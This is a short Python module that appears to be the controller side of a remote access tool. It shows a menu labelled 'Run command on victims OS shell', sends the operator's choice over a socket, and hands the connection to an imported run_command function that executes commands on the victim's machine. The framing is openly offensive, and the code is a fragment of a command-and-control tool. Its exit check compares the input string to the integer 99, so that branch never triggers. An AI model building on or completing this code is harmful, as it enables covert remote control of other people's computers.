import socket
from colorama import Fore
from core.command import run_command

def options():
    print("\n")
    print(Fore.GREEN + "\n[01] Run command on victims OS shell.")



def handleConnection(socket):
    print(Fore.MAGENTA + "[-] Handling Connection ")

    while True:
        options()
        usr_input = input("[-] Select options :")

        socket.send_data(usr_input)
        if usr_input == "1":
            print(Fore.GREEN + "[+] Running the system commands in the victims shell.")

            run_command(socket)
        
        elif usr_input == 99:
            break

        else:
            print(Fore.RED + "[+] Invalid input.")
            